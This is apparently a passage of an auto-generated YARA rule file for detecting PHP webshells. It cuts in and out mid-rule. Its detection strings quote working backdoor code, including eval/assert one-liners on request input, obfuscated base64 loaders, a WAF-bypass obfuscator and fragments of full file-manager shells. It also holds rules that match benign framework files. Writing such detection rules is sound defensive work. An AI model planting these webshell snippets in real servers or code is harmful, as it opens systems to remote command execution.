{
   meta:
      description = "php17 - file 0f964d3fab064cb791677836f5a7f6a6d97d69c8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fed7fa524fca9a66b4c55787567dce53712f0588e44e439e8d00b77f3ddfbd7a"
   strings:
      $s1 = "<?php$func = new ReflectionFunction(\"system\");echo $func->invokeArgs(array(\"$_GET[c]\"));?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AssetNotFoundException
{
   meta:
      description = "php17 - file AssetNotFoundException.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6947600d8da2e2746919eb3adc86fcefea0d36a99e6871fa71f1d54e79a5ba29"
   strings:
      $s1 = "namespace Modules\\Core\\Foundation\\Asset;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AllowedHostsMiddleware
{
   meta:
      description = "php17 - file AllowedHostsMiddleware.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "53ab731fd3cefd08963855c57297b2fab4febf91ac0a7addd4d84ea477a48a26"
   strings:
      $s1 = "* @return array List of allowed Host header values" fullword ascii
      $s2 = "* Sets the list of allowed Host header values" fullword ascii
      $s3 = "* Secures requests by only allowing a whitelist of Host values" fullword ascii
      $s4 = "public function process(HTTPRequest $request, callable $delegate)" fullword ascii
      $s5 = "&& !in_array($request->getHeader('Host'), $allowedHosts)" fullword ascii
      $s6 = "* @param array|string $allowedHosts" fullword ascii
      $s7 = "$allowedHosts = $this->getAllowedHosts();" fullword ascii
      $s8 = "* List of allowed hosts" fullword ascii
      $s9 = "public function getAllowedHosts()" fullword ascii
      $s10 = "return new HTTPResponse('Invalid Host', 400);" fullword ascii
      $s11 = "* Can also specify a comma separated list" fullword ascii
      $s12 = "$allowedHosts = preg_split('/ *, */', $allowedHosts);" fullword ascii
      $s13 = "private $allowedHosts = [];" fullword ascii
      $s14 = "public function setAllowedHosts($allowedHosts)" fullword ascii
      $s15 = "class AllowedHostsMiddleware implements HTTPMiddleware" fullword ascii
      $s16 = "$this->allowedHosts = $allowedHosts;" fullword ascii
      $s17 = "return $this->allowedHosts;" fullword ascii
      $s18 = "if (is_string($allowedHosts)) {" fullword ascii
      $s19 = "use SilverStripe\\Control\\HTTPResponse;" fullword ascii
      $s20 = "if ($allowedHosts" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_357c42a48385c0f8e1436fd55236e3485e0b5543
{
   meta:
      description = "php17 - file 357c42a48385c0f8e1436fd55236e3485e0b5543.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "45b4d887b14bf288bb5fb0ed88484b1877cb16fc91aef8134e18523988c08fe4"
   strings:
      $s1 = "$str.=chr((ord(substr($data,$i,1))+256)-ord(substr($char,$i,1)));" fullword ascii
      $s2 = "$str.=chr(ord(substr($data,$i,1))-ord(substr($char,$i,1)));" fullword ascii
      $s3 = "$char.=substr($key,$x,1);" fullword ascii
      $s4 = "function My_base($data,$key){" fullword ascii
      $s5 = "if (ord(substr($data,$i,1))<ord(substr($char,$i,1)))" fullword ascii
      $s6 = "$key=$_REQUEST['key']; " fullword ascii
      $s7 = "$l = strlen($key);" fullword ascii
      $s8 = "if(@$_REQUEST['key']){" fullword ascii
      $s9 = "$data=base64_decode($data);" fullword ascii
      $s10 = "return base64_decode($str);" fullword ascii
      $s11 = "$St=Create_Function('',$text);$St();" fullword ascii
      $s12 = "echo 'No input file specified.';" fullword ascii
      $s13 = "$key=md5($key);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule sig_2016_06_22_211501_create_taggables_table
{
   meta:
      description = "php17 - file 2016_06_22_211501_create_taggables_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0280965d681233d29d4789316039e998dded5cf02d73addebf427b2f4aa371f8"
   strings:
      $s1 = "Schema::create('taggables', function (Blueprint $table) {" fullword ascii
      $s2 = "Schema::drop('taggables');" fullword ascii
      $s3 = "$table->integer('tag_id')->unsigned();" fullword ascii
      $s4 = "$table->string('taggable_type');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule php17_1_2
{
   meta:
      description = "php17 - file 1_2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "56bc0062f622030861f09d4e323c381ec7d1154f61dffd8aea0d347f96475fa1"
   strings:
      $s1 = "eval($_POST['shell']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_5e6ebbfad05b4855c32da7b7ab79e6e2d03efa80
{
   meta:
      description = "php17 - file 5e6ebbfad05b4855c32da7b7ab79e6e2d03efa80.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "928227227283b116df769c3cc04cd7c71ab111dc0a1e976936d2e8e5c59e59a0"
   strings:
      $s1 = "eval(\"function lambda_n() { eval($_GET[1]); }\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_01d8bae291b1e4724443375634ccfa0e
{
   meta:
      description = "php17 - file 01d8bae291b1e4724443375634ccfa0e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2e4374f321e1190e203472f9522275059ac713a589c8abc568d842d84b953c03"
   strings:
      $x1 = "* About: Confusion to encrypt php webshell, Bypass the WAF" fullword ascii
      $s2 = "$shellcode = '<?php $code=\\''.$source.'\\';'.\"\\r\\n\\r\\n\".$shellcode.'; ?>';" fullword ascii
      $s3 = "$shellcode = 'base64_decode('.$shellcode.')';" fullword ascii
      $s4 = "fwrite(fopen($output, 'w'), $shellcode);" fullword ascii
      $s5 = "echo \"#usage: php $argv[0] webshell EncodeTimes outputfile\\r\\n\";" fullword ascii
      $s6 = "$shellcode = '$code';" fullword ascii
      $s7 = "echo \"#E x p: php $argv[0] phpspy.php 1 nokill.php\\r\\n\";" fullword ascii
      $s8 = "$shellcode = 'preg_replace(base64_decode(\\'L2EvZQ==\\'),base64_decode(\\''.base64_encode('eval('.$shellcode.')').'\\'),\\'a\\')" ascii
      $s9 = "* Author: Laterain" fullword ascii
      $s10 = "* Time: 20130820" fullword ascii
      $s11 = "echo \"|____/ \\__, | .__/ \\__,_|___/___/\\r\\n\";" fullword ascii
      $s12 = "echo \"#T i p: More EncodeTimes less speed!\\r\\n\";" fullword ascii
      $s13 = "echo \"| |_) | |_| | |_) | (_| \\__ \\__ \\\\\\r\\n\";" fullword ascii
      $s14 = "echo \"|  _ \\| | | | '_ \\ / _` / __/ __|\\r\\n\";" fullword ascii
      $s15 = "$source = trim(trim(trim($source, '<?php'),'<?'),'?>');" fullword ascii
      $s16 = "$source = php_strip_whitespace($source);" fullword ascii
      $s17 = "$source = base64_encode($source);" fullword ascii
      $s18 = "for ($i = 0; $i < $argv[2]; ++$i) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      1 of ($x*) and 4 of them
}

rule sig_19fedcfef08ca11b3942cba630cb6e5233f39c9c
{
   meta:
      description = "php17 - file 19fedcfef08ca11b3942cba630cb6e5233f39c9c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7d644dd52e708d2abd3cd28090cd353b2ea2eb31a7e71f6d9eedd5f63a0bcbc5"
   strings:
      $x1 = "<?php @error_reporting(0);@ini_set('error_log',NULL);@ini_set('log_errors',0);@ini_set('html_erro" ascii
      $s2 = "<?php @error_reporting(0);@ini_set('error_log',NULL);@ini_set('log_errors',0);@ini_set('html_" fullword ascii
      $s3 = "errors',0);@ini_set('max_execution_time',0);@ini_set('output_buffering',0);@ini_set('display_errors', 0);@ini_set('file_uploads'" ascii
      $s4 = "xWkdsaGJtbFhha1pPTHc9PQ==')),file_get_contents(__FILE__))){define(\"CODE\",\"56|109|72|89|117|75|115|87\");echo(preg_replace(bas" ascii
      $s5 = "#ZOYlJqWW9SQ0t5aDJBudianiWjFNWmRDS2xSMmWidarnawatiwa4323awe2" fullword ascii
      $s6 = "=='))),''));}__halt_compiler();" fullword ascii
      $s7 = "JGTkljRVpXUzFKclYxVndhMUpoVW14VGVrMUhWa3RrYTFkVmNFVk5XbEpzVTBod1JWWkxWbXRYVlhBd1VtRlNiRk0yYkVaV1MxcHJVMVZ3YTFKaFVteFRNV3RHVmt0c1" ascii
      $s8 = "FsbHZVbmxsY0UxRVpHcFNRMHRzVWpKaWFrSnBZblpzUjJScU5WZGtiVEZZWmpkclUwdDNkMWRoYTJkNVl6QldNbG8wTlZOTGJqQkVUalpDTVVwdlZVZGFkazVYV21zNV" ascii
      $s9 = "UxaDNjMFpPYVdoSFNtOUpTR0ZxTVZST2QwNUlTamRyZVUwd1RrZEtjMnQ1U2prd1ZGRnRaRU5MYkZJeVltcFdSMXBtVW1wT2JFNVlXV2xvVTFwck9VZGlkMmhZV2psUm" ascii
      $s10 = "dGcHVPVlphYzJ4dFdqbEZhbUp4VW5sbGNFRkVZbkJTUTB0NlVsaGFibWhJU1hVNVYyRXdUbTFpTVZwWFpqZEplbHA2VWtOSmRVcFlaREJXYldNM2ExTk5kWEJIU205Vk" ascii
      $s11 = "dGZFZjRlZOV2xKc1UzZE5SMVpMY0ROWlZYQkZaVnBTYkZNelRrZFdTMlJyVTFWd01GSkxVbXhUUXpWRlZrdGtNMWxWY0VWTmFsSnNVM2ROUjFaTFVsUlhWWEF3U205Vl" ascii
      $s12 = "JrNHlWVEpqYUVwSFMzTkdiV1JzZEZoYWVuaFhXamwwVkV0d1FVUmljRkpEU3pCV01sbzBOVk5MYmpCRVRqWkNNVXB2VlVkYWRrNVhXbXM1Ums0eVZUSmphRXBIUzNOR2" ascii
      $s13 = "JVeHdNRVpPWWxKcVdXOVNRMHQ1YURKWmRXdFRXSHB6Ums1cGFFZEtiMGxJWVdvMVUwdGtTbnBYTUVsSFlXdG5hV052VG0xTWNEQldUV0pTYWxsdlVrTkxlV2d5V1hWcl" ascii
      $s14 = "IwdHRiREpsY0VGRVluQlNRMHR6U2xoa2FtaElTWFU1VjJFd1RtMWlNVnBYWmpkRmFtSnhVa05KZFVwWVpEQldiV00zYTBOTmMyeEhTbTlOU0dSMVZrZGtkVGt5V1daU1" ascii
      $s15 = "1rOXdaME5rY0RWWFlXWjRiV014VGxkUWVEUnRZV3R6V0V0M2QxZGhhMmREWkd4a1IyVm5OREppY0ZJeldYVldibG9nSnlobFpHOWpaV1JmTkRabGMyRmlLR3hoZG1VPQ" ascii
      $s16 = "YyUnRNVE5QTVVFelkydEJhV0o1Vmtoa2JFb3pUM0F3TVU1aVVtcFpiMUpEUzNsb01sbDFhMU5ZTW5OR1RtbG9SMHB2U1VoaGFqVlRTMlJXZWxjd1NVZGhhMmRwWTI5T2" ascii
      $s17 = "EyUjNPVWRrYkU0eldITktXR1JxZEZSTGVIZHBWVVphTUZWUFJtdFZWVFZyVlZaU1ZsSlRPVVpXVVRsRlZGTldNVkZ6UldwaWNWSkRTekJDTTJJd1ZqSmpabmh0WXpGT0" ascii
      $s18 = "IxcDJUbGRhYXpsR1RqSlZNbU5vU2tkTGJGSXlZbXBXUjFwelNsaGtiM2R0WXpGT1IyVTNiSGxOTUU1SFNtOXZNMkZvVm0xalIwcFlaRzlTV0ZsSFFtbGlkbXhIWkdvMV" ascii
      $s19 = "JXUnNkRmhMY0d0NVNqRnNlbFpvY0c1VFdYQnNUVFZaYTFrMVdqRk5XbVJEUzJ4U01tSnFWa2RhWmxKcVRteE9XRmxwYUhsak1FNVlZVFJXTWxoMU9WZGhNRTV0WWpGYV" ascii
      $s20 = "1tTjJlREpaWm5odFl6Rk9Nazl3UldwaWNWSkRTMnBXUjJWc09VWmllVll6V1RsSmVscDZVbmxQY0VGRVluQlNRMHhOU2xaV1psSkdWVkI0YTFWV1RrVk1lRFJ0WVd0bl" ascii
   condition:
      uint16(0) == 0x0a09 and filesize < 7KB and
      1 of ($x*) and 4 of them
}

rule AbstractError
{
   meta:
      description = "php17 - file AbstractError.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4baa1a8487fdb1283d6fbc4d81b377990f875c3a107a4be4e5c7686fabd86fa9"
   strings:
      $s1 = "use Concrete\\Core\\Error\\ErrorList\\Field\\FieldInterface;" fullword ascii
      $s2 = "namespace Concrete\\Core\\Error\\ErrorList\\Error;" fullword ascii
      $s3 = "$r = ['message' => $this->getMessage()];" fullword ascii
      $s4 = "* @param mixed $field" fullword ascii
      $s5 = "* @var FieldInterface" fullword ascii
      $s6 = "public function getField()" fullword ascii
      $s7 = "public function setField(FieldInterface $field)" fullword ascii
      $s8 = "abstract class AbstractError implements ErrorInterface" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_101dc25b77d866984c81006bb34dc9ef713b4f5a
{
   meta:
      description = "php17 - file 101dc25b77d866984c81006bb34dc9ef713b4f5a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4adc6c5373c4db7b8ed1e7e6df10a3b2ce5e128818bb4162d502056677c6f54a"
   strings:
      $x1 = "*                           Safe0ver Shell - Safe Mod Bypass By Evilc0der - Edited By KingDefacer               *" fullword ascii
      $x2 = "echo sp(3).buildUrl( $img[\"Execute\"], \"cmd=execute&file=$dir/$file\").\"\\n\";" fullword ascii
      $x3 = "elseif ( $cmd==\"execute\" ) {/*<!-- Execute the executable -->*/" fullword ascii
      $x4 = "elseif ( $cmd==\"uploadproc\" ) {" fullword ascii
      $x5 = "//$http_auth_pass = \"phpshell\";      " fullword ascii
      $s6 = "$scriptident = \"$scriptTitle By Evilc0der.com\";" fullword ascii
      $s7 = "<center>&nbsp;<?php include ($a.$b.$c); echo $scriptident ?> - <?php echo $scriptver ?> - <?php echo $scriptdate ?>&nbsp" fullword ascii
      $s8 = "<strong> <font size=3><?php echo $scriptident ?> - <?php echo $scriptver ?> - <?php echo $scriptdate ?></font> </strong>" fullword ascii
      $s9 = "<option value=\"cat /var/cpanel/accounting.log\">cat /var/cpanel/accounting.log</option>" fullword ascii
      $s10 = "//$http_auth_user = \"phpshell\";   " fullword ascii
      $s11 = "<strong> <font size=3><?php echo $scriptident ?> - <?php echo $scriptver ?> - <?php echo $scriptdate ?></font> </stron" fullword ascii
      $s12 = "elseif ( $cmd==\"edit\" ) {" fullword ascii
      $s13 = "/* <!-- Execute --> */" fullword ascii
      $s14 = "header(\"Content-Disposition: attachment; filename=$downloadto$add\");" fullword ascii
      $s15 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"></HEAD>" fullword ascii
      $s16 = "elseif ( $cmd==\"saveedit\" ) {" fullword ascii
      $s17 = "elseif ( $cmd==\"deldir\" ) {" fullword ascii
      $s18 = "elseif ( $cmd==\"newdir\" ) {" fullword ascii
      $s19 = "<!-- <?php echo $scriptident ?>, <?php echo $scriptver ?>, <?php echo $scriptdate ?>  -->" fullword ascii
      $s20 = "$safemodgec = shell_exec($evilc0der);" fullword ascii
   condition:
      uint16(0) == 0x3c20 and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_385c95f5347f8e95fbb3730f171ae92d53c7dc7a
{
   meta:
      description = "php17 - file 385c95f5347f8e95fbb3730f171ae92d53c7dc7a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "71305372f75d31a6f2e3009f82183ae95e056c8f005456563d71885089c9c90e"
   strings:
      $s1 = "echo shell_exec($_POST['command']);" fullword ascii
      $s2 = "AAAAAAAAAAAAAAB" ascii
      $s3 = "$file=@fopen($_FILES['userfile']['tmp_name'],\"r\") or die (\"[-]Error reading file!\");" fullword ascii
      $s4 = "<form action=<?php echo $surl ?>?&<?php echo $word ?>&exec_st method=\"post\">" fullword ascii
      $s5 = "<form action=<?php echo $surl ?>&<?php echo $word ?>&exec method=\"post\">" fullword ascii
      $s6 = "mkdir(urldecode($_POST['dir']).\"/\".$_POST['name']) or die (\"[-]Error creating dir!\");" fullword ascii
      $s7 = "if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir .\"/\". $_FILES['userfile']['name'])) {" fullword ascii
      $s8 = "echo \"</a></td><td><a href=\".$surl.\"&\".$word.\"&download&file_browser&file=\".urlencode($j_d).\"/\".urlencode($file).\">\";" fullword ascii
      $s9 = "<input type=\"submit\" name=\"sub\" value=\"Execute\"><br>" fullword ascii
      $s10 = "unlink(urldecode($dir).\"/\".$file) or die (\"[-]Error @ file:\".$file.\"\");" fullword ascii
      $s11 = "echo \"</textarea><br><br><input type=hidden name=file value=\".urlencode($_GET['file']).\"><input type=submit name=sub valu" fullword ascii
      $s12 = "<form enctype=\"multipart/form-data\" action=<?php echo $surl ?>&<?php echo $word ?>&upload method=\"post\">" fullword ascii
      $s13 = "By turning \"on\" safe you can make your shell in 404 Not Find mode if the user doesnt know your OWN set word!" fullword ascii
      $s14 = "<form action=<?php echo $surl ?>?&<?php echo $word ?>&special_d&file=<?php echo urlencode($filename) ?> method=post>" fullword ascii
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZGVzYwAAAAAAAAAuSUVDIDYxOTY2LTIuMSBEZWZhdWx0" fullword ascii
      $s16 = "<form enctype=\"multipart/form-data\" action=<?php echo $surl ?>&<?php echo $word ?>&special_crypt method=\"post\">" fullword ascii
      $s17 = "LFJlZmVyZW5jZSBWaWV3aW5nIENvbmRpdGlvbiBpbiBJRUM2MTk2Ni0yLjEAAAAAAAAAAAAAACxS" fullword ascii
      $s18 = "ZWZlcmVuY2UgVmlld2luZyBDb25kaXRpb24gaW4gSUVDNjE5NjYtMi4xAAAAAAAAAAAAAAAAAAAA" fullword ascii
      $s19 = "AABDb3B5cmlnaHQgKGMpIDE5OTggSGV3bGV0dC1QYWNrYXJkIENvbXBhbnkAAGRlc2MAAAAAAAAA" fullword ascii
      $s20 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule sig_7fb659ea40cfb30684ca41ce0e171273070d3518
{
   meta:
      description = "php17 - file 7fb659ea40cfb30684ca41ce0e171273070d3518.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3016b8259bd976273c6c705fdbffd0124e990b26e0d7986868fcb62c7715931b"
   strings:
      $s1 = "<?php eval($_POST['c']); ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_4003ae289e3ae036755976f8d2407c9381ff5653
{
   meta:
      description = "php17 - file 4003ae289e3ae036755976f8d2407c9381ff5653.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d0fc60b2ed3ab6bbb495c881abe4abb1c1ce542497b3d286f3761f7a192c5f60"
   strings:
      $s1 = "<form method=\"POST\" action=\"<?echo \"PHVayv.php?duzkaydet=$dizin/$duzenle&dizin=$dizin\"?>\" name=\"kaypos\">" fullword ascii
      $s2 = "<img border=\"0\" src=\"http://www.aventgrup.net/avlog.gif\"></td>" fullword ascii
      $s3 = "<form method=\"POST\" action=\"<?echo \"$fistik.php?yenidosya=1&dizin=$dizin\"?>\" " fullword ascii
      $s4 = "<form method=\"POST\" action=\"<?echo \"$fistik.php?yeniklasor=1&dizin=$dizin\"?>\" " fullword ascii
      $s5 = "<a href=\"<?echo \"$fistik\";?>.php?sildos=<?echo $ekinci;?>&dizin=<?echo $dizin;?>\" style=\"text-decoration: none\">" fullword ascii
      $s6 = "<a href=\"<?echo \"$fistik.php?silklas=$dizin/$ekinci&dizin=$dizin\"?>\" style=\"text-decoration: none\">" fullword ascii
      $s7 = "<a href=\"<?echo \"$fistik.php?dizin=$dizin/\" ?><?echo \"$ekinci\";?>\" style=\"text-decoration: none\">" fullword ascii
      $s8 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\"></td>" fullword ascii
      $s9 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/1.gif\"></td>" fullword ascii
      $s10 = "00000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left\"" fullword ascii
      $s11 = "<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse\" bordercolor=\"#111111\" width=\"100" fullword ascii
      $s12 = "<td rowspan=\"2\" height=\"19\"><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<?echo \"$dizin/$duzenle\"?></font></td>" fullword ascii
      $s13 = "000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left\"" fullword ascii
      $s14 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-CENTER: #000000 1px inset; BORDER-RIGHT: #0" fullword ascii
      $s15 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000" fullword ascii
      $s16 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT" fullword ascii
      $s17 = "<a href=\"<?echo \"$fistik.php?yenklas=1&dizin=$dizin\";?>\" style=\"text-decoration: none\">" fullword ascii
      $s18 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword ascii
      $s19 = "<a href=\"http://www.aventgrup.net\" style=\"text-decoration: none\">" fullword ascii
      $s20 = "<a style=\"text-decoration: none\" target=\"_self\" href=\"<?echo \"$fistik\";?>.php?duzenle=<?echo \"$ekinci\";?>&dizin=<?echo " ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule sig_831c2ac371a8ac18adda92b82a0d841f29432fea
{
   meta:
      description = "php17 - file 831c2ac371a8ac18adda92b82a0d841f29432fea.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0a7d7b5fa03fc9c4547cba0293f39d13de10acfbb8cb8fe24e1d2c76b0bf98fa"
   strings:
      $s1 = "header(\"Content-Range: bytes $range-\".($fsize - 1).'/'.$fsize);  " fullword ascii
      $s2 = "header('Content-Length: '.($fsize - $range));  " fullword ascii
      $s3 = "$cracktrack = strtolower($post_arr.$get_arr.$post_arr_key.$get_arr_key.$cook_arr_key.$other_shtuki);" fullword ascii
      $s4 = "return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) | " fullword ascii
      $s5 = "header('Content-Disposition: attachment; filename='.basename($filepath));  " fullword ascii
      $s6 = "header($_SERVER['SERVER_PROTOCOL'].' 206 Partial Content');" fullword ascii
      $s7 = "header('Content-transfer-encoding: binary');  " fullword ascii
      $s8 = "$my_keyw = $_SERVER['HTTP_USER_AGENT'];" fullword ascii
      $s9 = "return '<font color=\"#00ff00\">'.$my_owner.':'.$my_group.'</font> '.date (\"M d Y H:i:s\", filemtime($myfile));" fullword ascii
      $s10 = "Shell command:<br/><input name=\"shcom\"><br/>" fullword ascii
      $s11 = "this.list_target.appendChild( new_row );};};" fullword ascii
      $s12 = "$aI['EM'] = 'Compressed size is not equal with the value in header information.';" fullword ascii
      $s13 = "$aI['EM'] = 'Uncompressed size is not equal with the value in header information.';" fullword ascii
      $s14 = "if(!empty($file2zip) && is_array($file2zip) && isset($_POST[zip_path]) && isset($_POST[zip_submit]))" fullword ascii
      $s15 = "if(!empty($arhiv) && is_array($arhiv) && isset($_POST[unzip_path]) && isset($_POST[unzip_submit]))" fullword ascii
      $s16 = "$ziper->addFile(file_get_contents($ziparc[$i]),$name2add);" fullword ascii
      $s17 = "<form enctype=\"multipart/form-data\" action=\"<?php print \"$site?$kverya\"; ?>\" method=\"post\">" fullword ascii
      $s18 = "print 'Hostname:Port: '.$_SERVER['SERVER_NAME'].':'.$_SERVER['SERVER_PORT'];" fullword ascii
      $s19 = "$other_shtuki=@file_get_contents('php://input');" fullword ascii
      $s20 = "this.list_target = list_target;" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 100KB and
      8 of them
}

rule sig_483589fa9e7d23be4505064f83ba6bedc824aab2
{
   meta:
      description = "php17 - file 483589fa9e7d23be4505064f83ba6bedc824aab2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "403ab77fbfdcee54e3aca528e77266a31f5fd84ea57ab380f9b0799c9e018f6e"
   strings:
      $s1 = "<?php $e = $_REQUEST['e'];$arr = array($_POST['settoken'],);array_map(base64_decode($e), $arr);?>" fullword ascii
      $s2 = "<?php ($b4dboy = $_POST['b4dboy']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add');?>" fullword ascii
      $s3 = "* $a=$_POST[];  " fullword ascii
      $s4 = "http://192.168.1.5/x.php?x=lostwolf  " fullword ascii
      $s5 = "<?php $lang = (string)key($_POST);$lang($_POST['test']);?>" fullword ascii
      $s6 = "<?php $x_x=base64_decode(Y.X.N.z.Z.X.J01);$x_x(($_POST[$_GET[a]]));?>" fullword ascii
      $s7 = "<?php $a = base64_decode(Y.X.N.z.Z.X.J01);$a($_POST[g]);?>" fullword ascii
      $s8 = "<?php  $a = \"a\".\"s\".\"s\".\"e\".\"r\".\"t\";  $a($_POST[cc]);  ?>" fullword ascii
      $s9 = "<?php $a = str_replace(x,\"\",\"axsxxsxexrxxt\");$a($_POST[\"#\"]); ?>" fullword ascii
      $s10 = "$str=$rc->getDocComment();  " fullword ascii
      $s11 = "?id=eval%28base64_decode%28%22QGV2YWwoJF9QT1NUWydjJ10pOw%22%29%29; " fullword ascii
      $s12 = "/*--------------------------------------------------------------------------------*/ " fullword ascii
      $s13 = "$array[0]['wind']($_POST['xiaozhe']); " fullword ascii
      $s14 = "* assert  " fullword ascii
      $s15 = "<?php substr(md5($_REQUEST['x']),28)=='acd0'&&eval($_REQUEST['c']);?>" fullword ascii
      $s16 = "]);eval($Exp($_POST[z0]));?>" fullword ascii
      $s17 = "<?php $Exp=strrev($_POST[" fullword ascii
      $s18 = "<?php $p=base64_decode(\"bW93YW5n\");$i['j']='assert';$a[]=$i;@$a[0]['j']($_POST[$p]);$filename = $php_self=substr($_SERVER['PHP" ascii
      $s19 = "<?php $p=base64_decode(\"bW93YW5n\");$i['j']='assert';$a[]=$i;@$a[0]['j']($_POST[$p]);$filename = $php_self=substr($_SERVER['PHP" ascii
      $s20 = "[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule administrable
{
   meta:
      description = "php17 - file administrable.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d72852e6a4bef0bc8e1e002d3156981d1bb25113b7cb771e55a7a0490b77d5fd"
   strings:
      $x1 = "* @link       http://www.GetAnahita.com" fullword ascii
      $s2 = "* @param KCommandContext $context Context parameter" fullword ascii
      $s3 = "* @author     Rastin Mehr <rastin@anahitapolis.com>" fullword ascii
      $s4 = "* @author     Arash Sanieyan <ash@anahitapolis.com>" fullword ascii
      $s5 = "* @param KConfig $config An optional KConfig object with configuration options." fullword ascii
      $s6 = "* @license    GNU GPLv3 <http://www.gnu.org/licenses/gpl-3.0.html>" fullword ascii
      $s7 = "protected function _actionConfirmrequest(KCommandContext $context)" fullword ascii
      $s8 = "protected function _actionIgnorerequest(KCommandContext $context)" fullword ascii
      $s9 = "$dispatcher = $this->getService('anahita:event.dispatcher');" fullword ascii
      $s10 = "protected function _actionRemoveadmin(KCommandContext $context)" fullword ascii
      $s11 = "protected function _actionGetsettings(KCommandContext $context)" fullword ascii
      $s12 = "protected function _actionRemoveapp(KCommandContext $context)" fullword ascii
      $s13 = "public function fetchRequester(KCommandContext $context)" fullword ascii
      $s14 = "protected function _actionAddadmin(KCommandContext $context)" fullword ascii
      $s15 = "protected function _actionAddapp(KCommandContext $context)" fullword ascii
      $s16 = "sprintf(AnTranslator::_('COM-ACTORS-PROFILE-HEADER-EDIT')," fullword ascii
      $s17 = "$this->getItem()->components->extract($data->app);" fullword ascii
      $s18 = "$this->getItem()->components->insert($data->app);" fullword ascii
      $s19 = "* Get settings." fullword ascii
      $s20 = "public function fetchAdmin(KCommandContext $context)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule sig_1a045ab370b7fb266c07f9c7a2ebebeba74f3707
{
   meta:
      description = "php17 - file 1a045ab370b7fb266c07f9c7a2ebebeba74f3707.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f605ff982d6f4401b070708820b3922495cf9fccb722b0e05e07eb8f728445a8"
   strings:
      $s1 = "<?php$_POST['sa']($_POST['sb']);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule Andela_1C3_v3_Private_Release_2017
{
   meta:
      description = "php17 - file Andela-1C3-v3-Private-Release-2017.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a067ff53c2da0add29f0be2f0957f9fd8a673850cdec2747e8ccfe9676eeeb90"
   strings:
      $x1 = "$andela = \"7L12attTsjD82Tkn/wHh+I7sK1sEN1a0LUK4E9xKQ3EyxweACGPFUxAkkMnz29+qxk9jk1VEmfvM814lslWgu7q6urqW7q7q9ypi8VDqgQr9jaYXC5oO" ascii
      $s2 = "$brow = urlencode($_SERVER['HTTP_USER_AGENT']);" fullword ascii
      $s3 = "echo @eval(@file_get_contents(@$_REQUEST[\"qwert\"]));" fullword ascii
